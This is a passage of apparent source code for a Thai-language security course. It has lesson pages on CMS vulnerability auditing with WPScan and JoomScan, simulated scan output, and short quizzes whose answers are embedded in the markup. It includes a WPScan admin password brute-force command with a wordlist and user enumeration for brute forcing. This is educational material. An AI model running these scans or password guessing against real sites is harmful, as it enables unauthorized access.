<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> Bash Shell command</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> PHP Server Script</div>
</div>
</div>

<!-- Question 2 -->
<div class="mq-q" data-correct="A">
<div class="mq-title"><span>Q2.</span> คีย์เวิร์ดมาตรฐาน HTML tag ใดที่นักโจมตีใช้ส่ง XSS Payload เพื่อเปิดจำลองกล่องป๊อปอัพ?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> &lt;script&gt;</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> &lt;iframe&gt;</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> &lt;div&gt;</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> &lt;img&gt;</div>
</div>
</div>

<button class="mq-btn-check" onclick="checkMiniQuiz179(179)">Check Answers / ตรวจคำตอบ</button>
<div id="mq-status-179" class="mq-status-bar"></div>
</div>

<div class="mq-gauge-col">
  <span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em; text-align:center;">Lesson Progress</span>
  <div class="neon-gauge-container">
    <svg class="neon-gauge" viewBox="0 0 36 36">
      <defs>
        <linearGradient id="gauge-grad-179" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#ff007f" />
          <stop offset="50%" stop-color="#fbbf24" />
          <stop offset="100%" stop-color="#00f0ff" />
        </linearGradient>
      </defs>
      <path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <path class="neon-gauge-fill" id="lesson-gauge-fill-179" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text-179">0%</text>
    </svg>
  </div>
  <span id="lesson-status-txt-179" class="mt-3 d-block text-muted" style="font-size:0.78rem; text-align:center;">โปรดตอบคำถามให้ครบ 2 ข้อ</span>
</div>
</div>
</div>

<script>
document.querySelectorAll('#mq-box-179 .mini-opt').forEach(function(opt) {
  opt.addEventListener('click', function() {
    var parent = this.closest('.mq-q');
    parent.querySelectorAll('.mini-opt').forEach(function(o) { o.classList.remove('selected'); });
    this.classList.add('selected');
    updateMiniProgress179(179);
  });
});

function updateMiniProgress179(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var qGroups = box.querySelectorAll('.mq-q');
  var answeredCount = 0;
  qGroups.forEach(function(g) {
    if (g.querySelector('.mini-opt.selected')) {
      answeredCount++;
    }
  });
  var pct = Math.round((answeredCount / qGroups.length) * 100);
  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status = document.getElementById('lesson-status-txt-' + lnum);
  if (fill) fill.setAttribute('stroke-dasharray', pct + ', 100');
  if (text) text.textContent = pct + '%';
  if (status) {
    if (pct === 100) {
      status.innerHTML = '<span style="color:#00f0ff; font-weight:bold;">กรุณากดตรวจคำตอบ</span>';
    } else if (pct > 0) {
      status.textContent = 'ตอบคำถามแล้ว ' + answeredCount + '/' + qGroups.length + ' ข้อ';
    } else {
      status.textContent = 'โปรดตอบคำถามให้ครบ 2 ข้อ';
    }
  }
}

function checkMiniQuiz179(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var groups = box.querySelectorAll('.mq-q');
  var score = 0;
  var allAnswered = true;
  groups.forEach(function(g) {
    if (!g.querySelector('.mini-opt.selected')) allAnswered = false;
  });
  if (!allAnswered) {
    alert("กรุณาตอบคำถามท้ายบทให้ครบถ้วนทั้ง 2 ข้อก่อนส่งตรวจคำตอบครับ!");
    return;
  }
  groups.forEach(function(g) {
    var correctVal = g.getAttribute('data-correct');
    var selected = g.querySelector('.mini-opt.selected');
    var selectedVal = selected.getAttribute('data-val');
    g.querySelectorAll('.mini-opt').forEach(function(o) {
      o.classList.remove('correct', 'incorrect');
      var val = o.getAttribute('data-val');
      if (val === correctVal) {
        o.classList.add('correct');
      } else if (o.classList.contains('selected')) {
        o.classList.add('incorrect');
      }
    });
    if (selectedVal === correctVal) score++;
  });

  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status_txt = document.getElementById('lesson-status-txt-' + lnum);
  var status = document.getElementById('mq-status-' + lnum);
  status.style.display = 'block';

  if (score === 2) {
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
    
    localStorage.setItem('solved_lesson_179', 'solved');
    if (typeof updateProgressUI === 'function') updateProgressUI();
    groups.forEach(function(g) {
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
  } else {
    var errorPct = Math.round((score / groups.length) * 100);
    if (fill) { fill.setAttribute('stroke-dasharray', errorPct + ', 100'); fill.style.stroke = '#ff007f'; }
    if (text) text.textContent = errorPct + '%';
    if (status_txt) status_txt.textContent = 'ตอบไม่ถูกต้อง ลองใหม่!';

    status.style.background = 'rgba(255,0,127,0.08)';
    status.style.border = '1px solid rgba(255,0,127,0.25)';
    status.style.color = '#ff007f';
    status.innerHTML = '❌ <strong>ยังไม่ผ่าน!</strong> คุณได้คะแนน ' + score + '/2 (ทำข้อสอบไม่จบตาม Gauge Bar Progress) กรุณาทบทวนบทเรียนและตรวจเลือกคำตอบใหม่อีกครั้ง';
  }
}

setTimeout(function() {
  var solved = localStorage.getItem('solved_lesson_179');
  if (solved === 'solved') {
    var box = document.getElementById('mq-box-179');
    var groups = box.querySelectorAll('.mq-q');
    groups.forEach(function(g) {
      var correctVal = g.getAttribute('data-correct');
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        var val = o.getAttribute('data-val');
        if (val === correctVal) {
          o.classList.add('selected', 'correct');
        }
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
    
    var fill = document.getElementById('lesson-gauge-fill-179');
    var text = document.getElementById('lesson-gauge-text-179');
    var status_txt = document.getElementById('lesson-status-txt-179');
    var status = document.getElementById('mq-status-179');
    
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.display = 'block';
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
  }
}, 200);
</script>
"""

# ─── Lesson 180: CMS Exploitation & Vulnerability Audit ───
val180_0 = """## 🛡️ CMS Exploitation & Vulnerability Audit (การป้องกันและการทดสอบความปลอดภัยเว็บ)
---

ยินดีต้อนรับสู่บทเรียนการตรวจสอบความมั่นคงปลอดภัยและความเปราะบางของระบบจัดการเนื้อหาเว็บไซต์สำเร็จรูป (CMS)

### 📄 SLIDE 151-155: CMS Exploitation Overviews (ภาพรวมความเสี่ยงของเว็บสำเร็จรูป)
- **Content Management System (CMS)**: ระบบจัดการสารสนเทศและเนื้อหาเว็บสำเร็จรูปยอดฮิต เช่น WordPress, Joomla, Drupal และ Magento ซึ่งมักตกเป็นเป้าการเจาะระบบเพื่อดึงข้อมูลลับ ขโมยสิทธิ์ หรือลอบฝังคำสั่งประหาร (RCE)
- **อัตราครองส่วนแบ่งตลาดของระบบ CMS (สถิติล่าสุด)**:
  - **WordPress**: 62.7% (เป้าโจมตีอันดับหนึ่ง)
  - **Shopify**: 6.4%
  - **Wix**: 3.9%
  - **Squarespace**: 3.0%
  - **Joomla**: 2.4%
  - **Drupal**: 1.3%
- **โปรแกรมสแกนความมั่นคง CMS ที่ได้รับความนิยม**:
  - **WPScan**: เจาะจงสแกนช่องโหว่ WordPress (ใช้งานง่าย มีฐานข้อมูลปลั๊กอินช่องโหว่ขนาดใหญ่)
  - **JoomScan**: เจาะจงหาจุดอ่อนและค่าคอนฟิกผิดพลาดของระบบ Joomla
  - **Droopescan**: ตรวจสอบหาจุดอ่อนระบบ Drupal และ SilverStripe
  - **CMSeek**: โปรแกรมตรวจจับระบุแบรนด์ CMS อัตโนมัติและช่วยชี้เป้าช่องโหว่เบื้องต้น

---

### 📄 SLIDE 156-163: การทดสอบเจาะระบบ WordPress ด้วย WPScan
- **WPScan**: เป็นตัวสแกนความปลอดภัยเฉพาะด้านสัจจะ WordPress รันผ่าน CLI บนเครื่อง Kali Linux
- **ตัวเลือกคำสั่งดึงพารามิเตอร์ระบบ (--enumerate)**:
  - `--enumerate v` (ดึงข้อมูลเวอร์ชันหลักและช่องโหว่)
  - `--enumerate p` (ดึงรายชื่อปลั๊กอินทั้งหมด)
  - `--enumerate vp` (เจาะจงดึงเฉพาะปลั๊กอินที่มีช่องโหว่ความเสี่ยง)
  - `--enumerate vt` (ดึงเฉพาะธีมที่มีช่องโหว่)
  - `--enumerate u` (ดึงรายชื่อผู้ใช้งานเพื่อนำไป brute force)
  - `--enumerate cb` (ค้นหาไฟล์แบ็คอัปโครงสร้าง config)
- **ตัวอย่างการใช้คำสั่ง**:
  - สแกนเพื่อหาปลั๊กอินเปราะบาง:
    ```bash
    wpscan --url https://example.com --enumerate vp
    ```
  - สั่งทดสอบการเดารหัสผ่านล็อกอินแอดมิน:
    ```bash
    wpscan --url https://example.com --passwords rockyou.txt --usernames admin
    ```

---

### 📄 SLIDE 164-168: Joomla Exploitation ด้วย JoomScan
- **JoomScan**: พัฒนาขึ้นโดย OWASP เพื่อใช้วิเคราะห์เว็บระบบ Joomla
- **ชุดคำสั่งสำคัญ**:
  - `joomscan -u https://example.com` (สแกนระบบพื้นฐานหาจุดอ่อน)
  - `joomscan -u https://example.com --joomla-version` (ตรวจสอบสืบหาเวอร์ชันติดตั้งหลัก)
  - `joomscan -u https://example.com --components` (ค้นหาคอมโพเนนต์และปลั๊กอินเสริมที่มีช่องโหว่)
  - `joomscan -u https://example.com --enumerate-users` (ดึงรายชื่อผู้ใช้งานระบบ)

---

### 📄 SLIDE 169-191: ตัวอย่างกรณีศึกษาโจมตี CMS
- **Brute Force**: การสุ่มเดารหัสผ่านหน้าเว็บบอร์ดแผงควบคุม (เช่น `/wp-login.php` หรือ `/administrator/`) จนกว่าจะสามารถเข้าควบคุมสิทธิ์
- **Vulnerable Plugin**: การใช้ประโยชน์จากปลั๊กอินเสริมหรือธีมตกรุ่นที่มีสิทธิ์เขียนสไลด์ หรืออัปโหลดไฟล์ เช่น ปลั๊กอินแกลเลอรีภาพถ่าย ปล่อยให้แฮกเกอร์ลอบส่ง Web shell นามสกุล `.php` เข้ามาทับสิทธิ์ควบคุมเซิร์ฟเวอร์หลังบ้าน"""

val180_1 = """### 💻 CMS Security Audit Sandbox (จำลองเรียกสแกนความปลอดภัย CMS)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาขั้นตอน และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลการสแกนความเปราะบาง:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #10b981 !important; color: #ffffff !important; background: rgba(16, 185, 129, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(16, 185, 129, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-wpscan" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('wpscan', this)">1. WPScan Vulnerability</button>
<button id="nav-item-joomscan" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('joomscan', this)">2. JoomScan Audit</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-wpscan" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. Scanning WordPress Vulnerabilities with WPScan</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); color: #10b981; font-family: monospace;">WPScan Tool</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #10b981; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">wpscan --url http://ctf.rpca.ac.th/wp/ --enumerate vp,u</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 4px; color: #10b981; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('wpscan')">▶ Run Simulation</button>
</div>
<div id="term-wpscan" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อยิงสแกน WPScan]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">คำสั่งค้นหาระบุปลั๊กอินที่มีช่องโหว่ความเสี่ยง (`vp`) และตรวจสอบรายชื่อผู้ใช้งาน (`u`) เพื่อวางสเปกประเมินความปลอดภัย</p>
</div>
</div>
<div id="panel-joomscan" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. Assessing Joomla Website Security with JoomScan</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); color: #10b981; font-family: monospace;">JoomScan Tool</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #10b981; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">joomscan -u http://ctf.rpca.ac.th/joomla/ --components</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 4px; color: #10b981; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('joomscan')">▶ Run Simulation</button>
</div>
<div id="term-joomscan" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อเริ่มทำ JoomScan]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอดตรวจสอบส่วนประกอบเสริม Joomla (components) เพื่อสืบค้นจุดรั่วไหลของซอร์สโค้ดและไลบรารีส่วนตัว</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#10b981';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(16, 185, 129, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#ffffff; font-weight:bold;">Running CMS mapping audits...</span>\\n[.] Executing target scanner engines...';
  setTimeout(() => {
    if (itemKey === 'wpscan') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">WPScan Output:</span>\\nWordPress version: 6.2.2 (Outdated)\\nFOUND User: admin (ID: 1)\\nFOUND Vulnerable Plugin: contact-form-7 v5.7.1 (XSS vulnerable)\\n\\n[+] WPScan Completed!';
    } else if (itemKey === 'joomscan') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">OWASP Joomla! Vulnerability Scanner:</span>\\nJoomla! version: 3.9.22 (Outdated)\\nFOUND: http://ctf.rpca.ac.th/joomla/configuration.php-bak (CODE: 200)\\n\\n[+] JoomScan completed successfully.';
    }
  }, 1000);
}
</script>"""

val180_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการผ่านบทเรียนย่อยนี้ (Lesson Clear):

<style>
.mini-quiz-box{width:100%;max-width:1050px;margin:2rem auto;background:rgba(15,17,26,0.45);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3);box-sizing:border-box;}
.mq-layout-container {display:flex; gap:24px; align-items:stretch;}
.mq-questions-col {flex:1;}
.mq-gauge-col {width:160px; display:flex; flex-direction:column; align-items:center; justify-content:center; border-left:1px solid rgba(255,255,255,0.06); padding-left:24px;}
@media (max-width: 768px) {
  .mq-layout-container {flex-direction:column;}
  .mq-gauge-col {width:100%; border-left:none; padding-left:0; border-top:1px solid rgba(255,255,255,0.06); padding-top:24px;}
}
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:url(#gauge-grad-180); stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease; filter:drop-shadow(0 0 5px rgba(0,240,255,0.4));}
.neon-gauge-text {fill:#ffffff; font-family:'JetBrains Mono',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}

.mq-q{margin-bottom:20px;}
.mq-title{font-size:0.9rem;font-weight:800;color:#e2e8f0;margin-bottom:10px;}
.mq-title span{color:#00f0ff;font-family:'JetBrains Mono',monospace;margin-right:6px;}
.mini-opts{display:flex;flex-direction:column;gap:6px;}
.mini-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;transition:all 0.15s ease;user-select:none;font-size:0.83rem;color:#cbd5e1;}
.mini-opt:hover{border-color:rgba(0,240,255,0.2);background:rgba(0,240,255,0.02);}
.mini-opt.selected{border-color:#00f0ff;background:rgba(0,240,255,0.08);color:#ffffff;}
.mini-opt.correct{border-color:#3ddc84;background:rgba(61,220,132,0.08);color:#ffffff;}
.mini-opt.incorrect{border-color:#ff007f;background:rgba(255,0,127,0.08);color:#ffffff;}
.mini-bullet{width:15px;height:15px;border:1px solid rgba(255,255,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.58rem;font-weight:bold;}
.mini-opt.selected .mini-bullet{border-color:#00f0ff;background:#00f0ff;color:#070910;}

.mq-btn-check{padding:10px 20px;background:#00f0ff;border:none;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:800;color:#070910;cursor:pointer;box-shadow:0 0 10px rgba(0,240,255,0.25);transition:all 0.15s ease;}
.mq-btn-check:hover{background:#ffffff;box-shadow:0 0 15px rgba(255,255,255,0.4);transform:translateY(-1px);}
.mq-status-bar{display:none;padding:12px 16px;border-radius:8px;font-size:0.85rem;margin-top:16px;font-weight:700;line-height:1.5;}
</style>

<div id="mq-box-180" class="mini-quiz-box">
<div class="mq-layout-container">
<div class="mq-questions-col">
<!-- Question 1 -->
<div class="mq-q" data-correct="A">
<div class="mq-title"><span>Q1.</span> ส่วนหัว (Header) ความปลอดภัยใดใน HTTP Response ที่ใช้ป้องกันหน้าเว็บไม่ให้ถูกนำไปฝังใน Iframe เพื่อเลี่ยงช่องโหว่ Clickjacking?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> X-Frame-Options</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> Content-Security-Policy</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> Strict-Transport-Security</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> X-XSS-Protection</div>
</div>
</div>

<!-- Question 2 -->
<div class="mq-q" data-correct="A">
<div class="mq-title"><span>Q2.</span> หลักปฏิบัติเพื่อความปลอดภัยในการป้องกันการแทรกโค้ดทำลายระบบเครือข่ายฐานข้อมูล (Injection) ทุกประเภทคือข้อใด?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> การกรองตรวจสอบความถูกต้องข้อมูลนำเข้า (Input Validation)</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> การเข้ารหัสฐานข้อมูล (Database Encryption)</div>
<div class="mini-opt" data-val="C"><span class="mini-bullet">C</span> การสำรองไฟล์ข้อมูลประจำวัน (Daily Backup)</div>
<div class="mini-opt" data-val="D"><span class="mini-bullet">D</span> การติดตั้งระบบแจ้งเตือนแฮกเกอร์ (Intrusion Detection)</div>
</div>
</div>

<button class="mq-btn-check" onclick="checkMiniQuiz180(180)">Check Answers / ตรวจคำตอบ</button>
<div id="mq-status-180" class="mq-status-bar"></div>
</div>

<div class="mq-gauge-col">
  <span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em; text-align:center;">Lesson Progress</span>
  <div class="neon-gauge-container">
    <svg class="neon-gauge" viewBox="0 0 36 36">
      <defs>
        <linearGradient id="gauge-grad-180" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#ff007f" />
          <stop offset="50%" stop-color="#fbbf24" />
          <stop offset="100%" stop-color="#00f0ff" />
        </linearGradient>
      </defs>
      <path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <path class="neon-gauge-fill" id="lesson-gauge-fill-180" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
      <text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text-180">0%</text>
    </svg>
  </div>
  <span id="lesson-status-txt-180" class="mt-3 d-block text-muted" style="font-size:0.78rem; text-align:center;">โปรดตอบคำถามให้ครบ 2 ข้อ</span>
</div>
</div>
</div>

<script>
document.querySelectorAll('#mq-box-180 .mini-opt').forEach(function(opt) {
  opt.addEventListener('click', function() {
    var parent = this.closest('.mq-q');
    parent.querySelectorAll('.mini-opt').forEach(function(o) { o.classList.remove('selected'); });
    this.classList.add('selected');
    updateMiniProgress180(180);
  });
});

function updateMiniProgress180(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var qGroups = box.querySelectorAll('.mq-q');
  var answeredCount = 0;
  qGroups.forEach(function(g) {
    if (g.querySelector('.mini-opt.selected')) {
      answeredCount++;
    }
  });
  var pct = Math.round((answeredCount / qGroups.length) * 100);
  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status = document.getElementById('lesson-status-txt-' + lnum);
  if (fill) fill.setAttribute('stroke-dasharray', pct + ', 100');
  if (text) text.textContent = pct + '%';
  if (status) {
    if (pct === 100) {
      status.innerHTML = '<span style="color:#00f0ff; font-weight:bold;">กรุณากดตรวจคำตอบ</span>';
    } else if (pct > 0) {
      status.textContent = 'ตอบคำถามแล้ว ' + answeredCount + '/' + qGroups.length + ' ข้อ';
    } else {
      status.textContent = 'โปรดตอบคำถามให้ครบ 2 ข้อ';
    }
  }
}

function checkMiniQuiz180(lnum) {
  var box = document.getElementById('mq-box-' + lnum);
  var groups = box.querySelectorAll('.mq-q');
  var score = 0;
  var allAnswered = true;
  groups.forEach(function(g) {
    if (!g.querySelector('.mini-opt.selected')) allAnswered = false;
  });
  if (!allAnswered) {
    alert("กรุณาตอบคำถามท้ายบทให้ครบถ้วนทั้ง 2 ข้อก่อนส่งตรวจคำตอบครับ!");
    return;
  }
  groups.forEach(function(g) {
    var correctVal = g.getAttribute('data-correct');
    var selected = g.querySelector('.mini-opt.selected');
    var selectedVal = selected.getAttribute('data-val');
    g.querySelectorAll('.mini-opt').forEach(function(o) {
      o.classList.remove('correct', 'incorrect');
      var val = o.getAttribute('data-val');
      if (val === correctVal) {
        o.classList.add('correct');
      } else if (o.classList.contains('selected')) {
        o.classList.add('incorrect');
      }
    });
    if (selectedVal === correctVal) score++;
  });

  var fill = document.getElementById('lesson-gauge-fill-' + lnum);
  var text = document.getElementById('lesson-gauge-text-' + lnum);
  var status_txt = document.getElementById('lesson-status-txt-' + lnum);
  var status = document.getElementById('mq-status-' + lnum);
  status.style.display = 'block';

  if (score === 2) {
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
